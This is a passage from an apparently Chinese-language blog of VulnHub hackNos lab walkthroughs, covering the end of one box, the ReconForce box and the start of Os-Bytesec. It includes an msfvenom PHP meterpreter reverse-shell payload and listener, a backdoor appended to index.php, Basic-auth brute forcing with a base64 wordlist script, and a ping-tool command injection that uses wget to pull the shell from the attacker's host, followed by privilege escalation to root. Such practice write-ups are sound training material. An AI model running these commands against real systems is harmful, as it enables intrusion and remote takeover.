class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2><p>Web页面中可以在左侧菜单中选择<code>Content &gt; File Manager</code>来管理文件<br />尝试写入Webshell，但是无法访问到文件</p><p>尝试使用msfvenom创建基于php的meterpreter后门，再写入到index.php中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br><span class="line">cat shell.php</span><br></pre></td></tr></table></figure><p>将内容复制到index.php文件末</p><p>在MSF中接收Meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在Meterpreter的shell中切换至交互shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br><span class="line">   uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><p>查看/etc/passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">blackdevil:x:1000:118:hackNos:&#x2F;home&#x2F;blackdevil:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>发现文件<code>/var/local/database</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;local&#x2F;database</span><br><span class="line"></span><br><span class="line">Expenses</span><br><span class="line">Software Licenses,$2.78</span><br><span class="line">Maintenance,$68.87</span><br><span class="line">Mortgage Interest,$70.35</span><br><span class="line">Advertising,$9.78</span><br><span class="line">Phone,$406.80</span><br><span class="line">Insurance,$9.04</span><br><span class="line">Opss;fackespreadsheet</span><br></pre></td></tr></table></figure><p>得到提示fackespreadsheet<br />在某个不存在的网站上搜索得到在线解密工具<br /><code>http://www.spammimic.com/spreadsheet.php?action=decode</code><br />解密得<code>Security@x@</code></p><p>尝试以此作为口令登入blackdevil账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh blackdevil@192.168.31.39</span><br><span class="line">Security@x@</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;1000(blackdevil) gid&#x3D;118(docker) groups&#x3D;118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)</span><br></pre></td></tr></table></figure><p>尝试sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">Security@x@</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>hydra在用于爆破Web登录时需要调整的参数有点多</p><ul><li>http请求类型</li><li>数据的参数名</li><li>登录成功/失败时所回应的信息<br />由于登陆失败会回应<code>Wrong email or password</code><br />所以借以该信息来判断是否登入成功</li></ul><p>获取Webshell时有些麻烦，一开始以为是传统的php一句话上传，结果发现上传的文件都不能打开，屡次尝试后转而使用Meterpreter获取Shell</p><p>解密过程的脑洞较大(感觉像是玩CTF的古典密码…)，善用搜索引擎总归是件好事</p><p>参考资料</p><blockquote><p><a href="https://blog.csdn.net/weixin_39219503/article/details/103865033">WP</a><br /><a href="https://blog.csdn.net/weixin_43039349/article/details/89323846">hydra</a></p></blockquote><hr /><h1 id="reconforce"><a class="markdownIt-Anchor" href="#reconforce"></a> <a href="https://www.vulnhub.com/entry/hacknos-reconforce-v11,416/">ReconForce</a></h1><p><code>2020/02/02 20:17:42</code></p><h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.109</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.109</span><br><span class="line">Host is up (0.00063s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.31.10</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)</span><br><span class="line">|   256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)</span><br><span class="line">|_  256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Recon_Web</span><br><span class="line">MAC Address: 08:00:27:83:C2:54 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-4"><a class="markdownIt-Anchor" href="#web路径枚举-4"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径<br />未发现有效信息<br />在主页处存在一个链接导向<code>/5ecure/</code>路径<br />存在Basic认证，而且附带一个提示信息<code>Recon Security</code></p><h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2><p>FTP服务允许匿名登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.31.109</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure><p>匿名登入之后发现不能进行进一步的操作</p><p>发现Banner为<code>Secure@hackNos</code></p><p>使用cewl生成字典<br /><code>cewl http://192.168.31.109/ &gt;&gt; data</code></p><p>添加一些常用词以及获取到的一些信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root&quot; &gt;&gt; data</span><br><span class="line">echo &quot;admin&quot; &gt;&gt; data</span><br><span class="line">echo &quot;Recon Security&quot; &gt;&gt; data</span><br><span class="line">echo &quot;Secure@hackNos&quot; &gt;&gt; data</span><br><span class="line">echo &quot;5ecure&quot; &gt;&gt; data</span><br><span class="line">echo &quot;&quot; &gt;&gt; data</span><br></pre></td></tr></table></figure><blockquote><p>Basic认证是基于Get请求进行的，需要附加的一个Head–<code>Authorization</code>，而其内容为<code>Basic xxxxxxxx</code>，其中<code>xxxxxxxx</code>为<code>user:pass</code>进行base64编码之后的结果</p></blockquote><p>使用python脚本转变为相应的格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#test.py</span><br><span class="line">import base64</span><br><span class="line">raw &#x3D; [ </span><br><span class="line">        &#39;Recon&#39;,</span><br><span class="line">        &#39;Web&#39;,</span><br><span class="line">        &#39;Home&#39;,</span><br><span class="line">        &#39;Service&#39;,</span><br><span class="line">        &#39;Blog&#39;,</span><br><span class="line">        &#39;hackNos&#39;,</span><br><span class="line">        &#39;TroubleShoot&#39;,</span><br><span class="line">        &#39;Security&#39;,</span><br><span class="line">        &#39;Recon Security&#39;,</span><br><span class="line">        &#39;Secure&#39;,</span><br><span class="line">        &#39;root&#39;,</span><br><span class="line">        &#39;5ecure&#39;,</span><br><span class="line">        &#39;admin&#39;,</span><br><span class="line">        &#39;Secure@hackNos&#39;,</span><br><span class="line">        &#39;Security@hackNos&#39;,</span><br><span class="line">        &#39;&#39;]</span><br><span class="line">for i in raw:</span><br><span class="line">        for j in raw:</span><br><span class="line">            print base64.b64encode(j + &#39;:&#39; + i)</span><br></pre></td></tr></table></figure><p><code>./test.py &gt; b64.dir</code></p><p>然后在Burp中使用生成的字典进行破解</p><blockquote><p>在爆破的时候遇到了问题，没有爆破出来账户，无奈之下只好在网上看看其他大神的思路，发现貌似作者是想在FTP Banner里写上Security@hackNos但实际写成了Secure@hackNos<br />修改一下脚本里面的raw数组之后发现爆破成功了<br />账户为<code>admin:Security@hackNos</code></p></blockquote><p>进入<code>/5ecure/</code>路径之后发现是一个ping工具，结合一下CTF的内容不难想到这个就是命令注入了，命令执行是在out.php下执行的，而且ping的结果会有回显</p><p><code>&amp; &amp;&amp; | || ;</code> 用这几个符号挨个尝试命令注入</p><p>发现<code>127.0.0.1|ls</code>可以列出当前目录下的文件</p><p><code>127.0.0.1|cat /etc/passwd</code> 也能读取passwd文件</p><p>尝试写入phpinfo<br /><code>127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.php</code></p><p>但是访问1.php时phpinfo未显示，可能存在过滤<br /><code>127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.txt</code></p><p>1.txt中显示的是<code>&lt;?php phpinfo;?&gt;</code></p><p>看样子是过滤掉了小括号</p><p>查看out.php</p><p><code>127.0.0.1|cat out.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;</span><br><span class="line">&#123;$cmd&#125;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>可以看到过滤掉了一些特殊符号，尝试使用wget命令来下载后门</p><p>使用msfvenom创建基于php的meterpreter后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p>去掉shell.php中开头的<code>/*</code></p><p>开启python的http服务</p><p><code>python -m SimpleHTTPServer 8000</code></p><p>在网页中执行wget</p><p><code>127.0.0.1|wget http://192.168.31.10:8000/shell.php</code></p><p>在MSF中接收Meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>再访问shell.php即可</p><h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2><p>在Meterpreter的shell中获取TTY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>在passwd文件中发现可用账户recon<br />一番尝试后发现账户密码同Basic认证的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su recon</span><br><span class="line">Security@hackNos</span><br><span class="line">sudo su</span><br><span class="line">Security@hackNos</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>如何找到靶机的IP?</p></blockquote><p>这个问题曾经让我头疼过一阵子<br />看着网上的WP，有些是使用<code>netdiscover</code>，但是个人倾向于将靶机与Kali的网络配置成桥接模式，即使<code>netdiscover</code>发现了靶机，也没有一个明显地特征可以在当前网段的众多机器中去区分<br />个人的话倒是会去看路由器的后台，然后看看本机上的多个IP<br />而Nmap在扫描靶机时，可以报告其MAC地址与相关厂商，而一般的靶机都会在80端口开放WEB服务，那么就可以扫描80端口，再配合上grep来节选出靶机<br /><code>nmap -p 80 -Pn -v -T5 192.168.31.0/24 | grep -B 6 virtual</code></p><blockquote><p>Web log</p></blockquote><p>在尝试命令执行的时候我也尝试了使用curl命令来进行数据外传，但是发现自己找不到Web服务的log文件，只好用find命令配合grep找，中间也稍微学习了一下grep的正则用法<br /><code>find /* -iname &quot;*.log&quot; | grep -E &quot;(apache|nginx)&quot;</code><br />大概是这个样子</p><p>参考资料</p><blockquote><p><a href="https://blog.csdn.net/qq_38526635/article/etails/82147980">FTP</a><br /><a href="https://blog.csdn.net/weixin_44214107/article/details/104056796">WP</a><br /><a href="https://blog.csdn.net/weixin_43754984/article/details/84328313">grep&amp;RE</a></p></blockquote><hr /><h1 id="os-bytesec"><a class="markdownIt-Anchor" href="#os-bytesec"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">Os-Bytesec</a></h1><p><code>2020/02/15 16:50:01</code></p><h2 id="端口扫描-5"><a class="markdownIt-Anchor" href="#端口扫描-5"></a> 端口扫描</h2><p><code>nmap -p- -Pn -sV -n -T5 -v -A 192.168.31.185</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.185</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">80&#x2F;tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Hacker_James</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445&#x2F;tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">2525&#x2F;tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)</span><br><span class="line">|   256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)</span><br><span class="line">|_  256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)</span><br><span class="line">MAC Address: 08:00:27:55:0A:C2 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.281 days (since Fri Feb 14 21:05:09 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;264 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: NITIN; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -18h25m11s, deviation: 3h10m31s, median: -16h35m11s</span><br><span class="line">| nbstat: NetBIOS name: NITIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   NITIN&lt;00&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   NITIN&lt;03&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   NITIN&lt;20&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: nitin</span><br><span class="line">|   NetBIOS computer name: NITIN\x00</span><br><span class="line">|   Domain name: 168.1.7</span><br><span class="line">|   FQDN: nitin.168.1.7</span><br><span class="line">|_  System time: 2020-02-14T21:43:57+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span 